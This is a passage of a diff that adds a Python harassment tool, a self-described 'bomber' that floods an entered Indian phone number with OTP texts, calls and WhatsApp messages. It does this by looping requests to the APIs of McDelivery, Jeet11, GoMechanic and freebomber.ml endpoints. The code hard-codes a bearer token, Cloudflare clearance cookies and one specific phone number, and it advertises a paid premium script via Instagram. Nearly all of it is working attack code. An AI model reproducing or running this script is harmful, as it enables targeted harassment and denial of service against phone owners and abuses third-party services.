+                    'TokenTimestamp': '150820220314',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
+                    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5Njk0NDQiLCJhcCI6Ijc1NDEzMDQzNCIsImlkIjoiMDA2YjEwMDQwMzAyMDVlNSIsInRyIjoiMDBjZmQyMGQ1NzgxODJlYjU4MTBjNWMxMmI5NDZkNzAiLCJ0aSI6MTY2MDUxMzQ1MTk5NH19',
+                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+                    'sec-ch-ua-mobile': '?1',
+                    'sec-ch-ua-platform': '"Android"',
+                    'source': 'Web',
+                }
+
+
+
+
+                params3 = {
+                    'isLoggedIn': 'false',
+                    'businessModelID': '18',
+                    'storeID': '1',
+                }
+
+                json_data3 = {
+                    'MobileNo': number,
+                }
+                response3 = requests.post('https://services.mcdelivery.co.in/api/auth/sendotp', params=params3, headers=headers3, json=json_data3)
+
+            def jeet():
+                headers2 = {
+                    'authority': 'api.jeet11.com',
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                    'dnt': '1',
+                    'origin': 'https://www.jeet11.com',
+                    'referer': 'https://www.jeet11.com/',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-site',
+                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                    'x-client-app-type': 'JEET11',
+                    'x-header-deviceid': '574a1fe8-a63a-421b-90f4-d73d0d276e60',
+                }
+
+                json_data2 = {
+                    'phoneNo': number,
+                    'countryAreaCode': '91',
+                    'language': 'English',
+                }
+                response2 = requests.post('https://api.jeet11.com/account-service/external/v1.0.0/sendOtp', headers=headers2, json=json_data2)
+
+
+            def gomechanic():
+                headers = {
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYmYiOjE2NjA1MTU2NDAuMCwiaWF0IjoxNjYwNTE1NjQwLjAsImp0aSI6ImI0YmMzY2FmNWQxZWE5OWRjOTZiNDMzY2NjNDMwMjRlMDIzYjQwYzZiNDlmMTE3YmMwOTk4ZjYxZTdkMjVmMzYxNTVhZTlkMjE2MTZlNzk1IiwiZXhwIjoxNjYzMTA3NjQwLjAsImF1ZCI6IjMiLCJzY29wZXMiOltdLCJzdWIiOiIxNjYwNTE1NjQwODcifQ.DvSAJJYe6zUGovXqVK6zs-g7ccYE3O--anVOp-j5L60-Bvt4mXYavcgwUd1R8V-4zqVt-CRhhxUyvI227mCfHe4Jts9To5N-XT9PotfXchxlAZYGegwGs_xpSuFgsbYZYJw4DaQ1wT7d4JtDROyneeqoRUXAwORz78WBetYMT5H_aZGqxK2El7QDFO6vgXP0N7arIsOO8RDH2qT9a02f2R--2KSgtpZhnruA_XHC7ZIHjEC97rkuS-tZQwofgSLmiyJCTrpZjeJM7UF_Pvhq20ftz6VYHMVgsplKvjVDr4KCE7oJkWqt-qAJOVvugPlsW7hjhTDPLQg8MQf9VOuRA-aolE2EU1T1UwVzUSDQJuhYFpwWRmGHug5kgnQR8VjNi_631oPCutsW66fUA4MxYlvEaVzwtImpb0LAApQdnr6frNrXk3W_ARau2cTOXhpo8qk-z4JlA1Mrawgc_pbDYL_TpxMD6d545v6l4NbPTr7aV0IKng3DfAG_7oP_ktp5cngZO7rYvL6ElD4wprFbzob3PiFBwqBaOOmGKJaOMrhqaQhO0-wI6cyHUq4dE5f0lPhphe0WsqzoLfnh2dnAwCKeFeFzIMeCpJfvatzi53I49uLZUBBwJmzKYlUKSbx0jA0q4fCrrniW-gGkcjlv86k-lwUKqHq_2hF4Vr8MrwA',
+                    'Connection': 'keep-alive',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'DNT': '1',
+                    'Origin': 'https://gomechanic.in',
+                    'Referer': 'https://gomechanic.in/',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                }
+
+                json_data = {
+                    'name': '',
+                    'car_type_id': 115,
+                    'mobile': number,
+                    'location': 'Gurgaon',
+                    'utm_source': '',
+                    'source_id': 15,
+                }
+                response = requests.post('https://gomechanic.app/api/v1/oauth/leads/create_new_lead', headers=headers, json=json_data)
+
+
+            try:
+                while True:
+                    flipkart()
+                    jeet()
+                    apollo()
+                    medbuzz()
+                    gomechanic()
+                    #macdonal()
+                    nira()
+                    #fastpronumber()
+                    #industrialapi()
+                    #fastpronumber()
+                    #rummyapi()
+                    #nira()
+                    #rummytime()
+                    #rummyapi()
+                    #snapmint()
+            except:
+                _under_()
+                chutmarike('Bombing stopped..')
+                _under_()
+                sys.exit()
+                
+                
+                
+
+        elif self.data_main==2:
+            _cls_front_under()
+            chutmarike('For call , custom msg and fastest api buy the premium script ..')
+            _under_()
+            chutmarike('To buy script contact me on instagram : @sincryptzork')
+            sys.exit()
+            number2 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
+            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number2+r)
+            
+            def callphp():
+                #
+                cookies13 = {
+                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
+                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
+                }
+
+                headers13 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Cache-Control': 'max-age=0',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                params13 = {
+                    'sr': number2,
+                    'key': '@itztktricks',
+                    'submit': 'Submit Query',
+                }
+
+
+                response13 = requests.get('https://freebomber.ml/tk/call/call.php', params=params13, cookies=cookies13, headers=headers13)
+            try:
+                while True:
+                    callphp()
+                    callphp()
+            except:
+                _under_()
+                chutmarike('Call Bombing Stopped ..')
+                _under_()
+                sys.exit()
+        elif self.data_main==3:
+            _cls_front_under()
+            number98 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
+            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number98+r)
+            
+            def mixbimb():
+                cookies122 = {
+                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
+                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
+                }
+
+                headers122 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://freebomber.ml/tk/mix/',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-User': '?1',
+                    'Cache-Control': 'max-age=0',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                params122 = {
+                    'sr': '9528027588',
+                    'key': '@itztktricks',
+                    'submit': 'Submit Query',
+                }
+                response = requests.get('https://freebomber.ml/tk/mix/hard-bomber.php', params=params122, cookies=cookies122, headers=headers122)
+            try:
+                while True:
+                    mixbimb()
+            except:
+                _under_()
+                chutmarike('Sms2 stopped ..')
+                _under_()
+                sys.exit()
+        elif self.data_main==4:
+            chutmarike('Coming soon ..')
+        elif self.data_main==5:
+            _cls_front_under()
+            chutmarike('For call , custom msg and fastest api buy the premium script ..')
+            _under_()
+            chutmarike('To buy script contact me on instagram : @sincryptzork')
+            sys.exit()
+            number9 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
+            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number9+r)
+            
+            def whatsappbomb():
+                cookies45 = {
+                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
+                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
+                }
+
+                headers45 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://freebomber.ml/tk/whatsapp/',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-User': '?1',
+                    'Cache-Control': 'max-age=0',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                params45 = {
+                    'sr': number9,
+                    'key': '@itztktricks',
+                    'submit': 'Submit Query',
+                }
+
+                response45 = requests.get('https://freebomber.ml/tk/whatsapp/whatsapp-bomber.php', params=params45, cookies=cookies45, headers=headers45)
+            try:
+                while True:
+                    whatsappbomb()
+            except:
+                _under_()
+                chutmarike('Whatsapp Bombing Stopped ..')
+                _under_()
+                sys.exit()
+        elif self.data_main==6:
+            os.system('python update.py' if os.name=='nt' else 'python3 update.py')
+        elif self.data_main==7:
+            _under_()
+            chutmarike('Exiting ..')
+            _under_()
+            sys.exit()
+
+    
+try:
+    samayuser = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Username : "+r)
+    samaypassword = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Password : "+r)
+except:
+    sys.exit()
+
+    
+if __name__ == '__main__':
+    bhai = Samay(samayuser,samaypassword)
+    bhai.Passwordencrypt()
